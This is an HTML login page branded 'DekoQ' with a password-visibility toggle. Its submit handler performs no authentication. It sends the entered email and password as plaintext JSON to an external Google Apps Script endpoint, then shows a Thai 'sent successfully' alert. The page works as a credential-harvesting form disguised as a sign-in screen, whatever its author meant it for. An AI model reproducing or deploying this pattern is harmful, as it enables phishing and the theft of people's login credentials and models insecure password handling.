<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }

    .container h1 {
      font-size: 3rem;
      margin: 0;
    }

    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
    }

    .input-group {
      position: relative;
      display: flex;
      align-items: center;
    }

    .input-group input {
      width: 100%;
      font-size: 1rem;
      border-radius: 8px;
      padding: 0.8rem 1.2rem;
      margin-bottom: 1.2rem;
      border: 1px solid #ccc;
      text-align: left;
    }

    .toggle-password {
      position: absolute;
      right: 1rem;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
    }

    .toggle-password svg {
      width: 1.2rem;
      height: 1.2rem;
      fill: #888;
    }

    button[type="submit"] {
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      font-size: 1rem;
      border-radius: 8px;
      cursor: pointer;
    }

    button[type="submit"]:hover {
      background: #000;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <input type="email" id="email" name="email" required placeholder="Value" />

        <label for="password">Password</label>
        <div class="input-group">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <button type="button" class="toggle-password" onclick="togglePassword()">
            <svg viewBox="0 0 24 24">
              <path id="eye-icon" d="M12 4.5C7 4.5 2.7 7.6 1 12c1.7 4.4 6 7.5 11 7.5s9.3-3.1 11-7.5c-1.7-4.4-6-7.5-11-7.5zm0 13c-3 0-5.5-2.5-5.5-5.5S9 6.5 12 6.5s5.5 2.5 5.5 5.5-2.5 5.5-5.5 5.5z"/>
            </svg>
          </button>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const eyeIcon = document.getElementById("eye-icon");

      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.setAttribute("d", "M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z");
      } else {
        passwordInput.type = "password";
        eyeIcon.setAttribute("d", "M12 4.5C7 4.5 2.7 7.6 1 12c1.7 4.4 6 7.5 11 7.5s9.3-3.1 11-7.5c-1.7-4.4-6-7.5-11-7.5zm0 13c-3 0-5.5-2.5-5.5-5.5S9 6.5 12 6.5s5.5 2.5 5.5 5.5-2.5 5.5-5.5 5.5z");
      }
    }

    const form = document.querySelector("#form");
    const scriptURL = "https://script.google.com/macros/s/AKfycby6SuSSgdHzk765vOObTNLXYNN0stvUi5qFtxFjhCqC_booYDtzbYTDm2sSVE21h9D03Q/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
        .then(response => {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        })
        .catch(error => {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
          console.error("Error!", error.message);
        });
    });
  </script>
</body>
</html>
